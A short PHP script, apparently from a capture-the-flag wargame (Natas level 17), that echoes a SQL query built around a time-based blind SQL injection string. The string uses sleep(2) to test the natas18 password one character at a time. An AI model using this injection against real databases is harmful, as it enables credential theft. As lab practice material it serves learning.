<?php

$username = 'username=natas18" AND IF(password LIKE BINARY "f%", sleep(2), null) AND ""="';

echo "SELECT * from users where username=\"".$username."\"" . "\n";

?>